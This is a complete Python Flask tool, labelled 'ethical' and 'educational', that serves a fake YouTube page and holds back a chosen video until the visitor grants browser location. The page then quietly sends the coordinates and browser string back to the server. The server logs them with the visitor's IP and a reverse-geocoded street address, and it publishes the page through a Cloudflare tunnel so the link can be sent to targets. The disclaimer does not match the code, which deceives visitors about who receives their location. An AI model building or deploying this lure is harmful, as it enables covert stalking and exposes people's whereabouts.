"""
===========================================================
   TOOL NAME: Location Tracker (Ethical Use)
   AUTHOR: WEBXPLOIT
   PURPOSE: Educational & Consent-Based Demonstration Only
===========================================================
"""
from flask import Flask, request, render_template_string
import requests
import datetime
import subprocess
import threading
import time
import re
import shutil
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
log_file = "locations_log.txt"

# Thread-safe lock for writing logs
file_lock = threading.Lock()

# Ask for YouTube video code
video_code = input(Fore.CYAN + "🎬 Enter YouTube video code (e.g., tSpTSohT08A): ").strip()
if not video_code:
    print(Fore.RED + "❌ Video code cannot be empty.")
    exit()

# HTML Template
HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <style>
        body {{
            background-color: #181818;
            color: white;
            font-family: Arial, sans-serif;
        }}
        header {{
            background-color: #202020;
            padding: 10px 20px;
            font-size: 24px;
            font-weight: bold;
        }}
        .logo {{
            color: red;
            font-weight: bold;
            margin-right: 10px;
        }}
        #video-container {{
            display: none;
            text-align: center;
            margin-top: 40px;
        }}
        iframe {{
            width: 80%;
            max-width: 800px;
            height: 450px;
            border: none;
        }}
        #error-msg {{
            color: orange;
            font-size: 18px;
            text-align: center;
            margin-top: 20px;
            display: none;
        }}
    </style>
</head>
<body>
    <header><span class="logo">YouTube</span> Video Viewer</header>
    
    <div id="video-container">
        <iframe id="video-frame" allowfullscreen allow="autoplay; encrypted-media"></iframe>
    </div>
    <div id="error-msg">⚠ Location permission is required to view this video.</div>

    <script>
        function showVideo() {{
            const iframe = document.getElementById('video-frame');
            iframe.src = "https://www.youtube.com/embed/{video_code}?autoplay=1";
            document.getElementById('video-container').style.display = 'block';
        }}

        function showError() {{
            document.getElementById('error-msg').style.display = 'block';
        }}

        window.onload = () => {{
            if (!navigator.geolocation) {{
                showError();
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (pos) => {{
                    showVideo();

                    fetch('/send-location', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json'
                        }},
                        body: JSON.stringify({{
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            browser: navigator.userAgent
                        }})
                    }}).catch(() => {{ }});
                }},
                () => {{
                    showError();
                }}
            );
        }};
    </script>

</body>
</html>
"""

# Reverse geocoding
def get_address_from_latlon(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
        headers = {"User-Agent": "YT-Location-Tracker/1.0"}
        response = requests.get(url, headers=headers, timeout=5)
        return response.json().get("display_name", "Unknown location")
    except:
        return "Reverse geocoding error"

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send-location', methods=['POST'])
def log_location():
    try:
        data = request.get_json()

        lat = data.get('lat')
        lon = data.get('lon')
        browser = data.get('browser', 'Unknown')

        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        address = get_address_from_latlon(lat, lon)

        # Create log entry
        log_entry = (
            f"[{timestamp}] "
            f"IP: {ip} | "
            f"Lat: {lat} | Lon: {lon} | "
            f"Address: {address} | "
            f"Browser: {browser}"
        )

        # Console logging
        print(Fore.GREEN + "\n📥 New Visitor")
        print(Fore.YELLOW + f"🕒 Time       : {timestamp}")
        print(Fore.BLUE   + f"🌐 IP         : {ip}")
        print(Fore.CYAN   + f"📍 Address    : {address}")
        print(Fore.MAGENTA + f"🧭 Coordinates : LAT {lat} | LON {lon}")
        print(Fore.WHITE  + f"🧭 Browser    : {browser}")
        print(Fore.GREEN  + "-" * 50)

        # Thread-safe file write
        with file_lock:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(log_entry + "\n")

        return "OK", 200

    except Exception as e:
        print(Fore.RED + f"❌ Error in /send-location: {e}")
        return "ERROR", 500


# Run Flask in thread
def run_flask():
    app.run(host="0.0.0.0", port=5000)


# MAIN
if __name__ == "__main__":

    # Start Flask
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(2)

    print(Fore.YELLOW + "🚀 Launching Cloudflare Tunnel...")

    cloudflared = shutil.which("cloudflared")
    if not cloudflared:
        print(Fore.RED + "❌ cloudflared is not installed or not in PATH!")
        exit()

    # Start Cloudflare tunnel
    cf = subprocess.Popen(
        [cloudflared, "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    # Read public URL
    public_url = None
    while True:
        line = cf.stdout.readline()
        if "trycloudflare.com" in line:
            match = re.search(r"https://[^\s]+", line)
            if match:
                public_url = match.group(0)
                break
        if not line:
            break

    if public_url:
        print(Fore.GREEN + f"\n🌐 Public URL: {Fore.CYAN}{public_url}")
        print(Fore.MAGENTA + "📡 Waiting for visitors... Press CTRL + C to stop.\n")
    else:
        print(Fore.RED + "❌ Could not start Cloudflare tunnel!")
        exit()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n🛑 Stopping server...")
        cf.terminate()
